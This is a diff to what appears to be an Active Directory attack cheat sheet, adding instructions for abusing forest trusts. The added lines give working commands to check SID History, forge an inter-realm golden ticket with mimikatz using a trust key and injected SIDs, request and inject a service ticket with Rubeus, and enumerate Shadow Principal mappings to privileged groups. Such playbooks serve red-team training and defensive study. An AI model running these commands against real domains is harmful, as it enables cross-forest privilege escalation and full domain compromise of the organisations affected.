@@ -206,13 +206,32 @@ Invoke-SQLOSCmd -Instance DB-SQLSRV -Command "whoami"
 ```
 ## Abuse Forest Trust
 ### SID History
-//add here
+1. Make sure SID History is enabled
+```
+Get-DomainTrust
+```
+If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means SID History is enabled
 
-### Shadow Principal
-//add here
+2. Forge Inter-Realm TGT with extra sids. We injected sid of trusted domain users with RID > 1000
+```
+mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
+```
+3. Asktgs with the generated kirbi ticket
+```
+Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
+```
+
+### Shadow Principal/PAM Trust
+The users in current forest can be "mapped" to privileged group like Domain Admins and Enterprise Admins. Use below command to enumerate _Shadow Principal_
+```
+Get-ADObject -Filter * -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
+```
+* `name` = Name of the shadow security principal
+* `member` = member of group/user in the bastion domain
+* `msds-ShadowPrincipalSid` = The SID for production domain group/user
 
 ### Foreign Principal
-Foreign principal means other user(s) from trusted domain that have access to current domain
+Foreign principal means other user(s) from trusted domain that have access to current domain resources
 ```
 # Get foreign user principals
 Find-ForeignUser
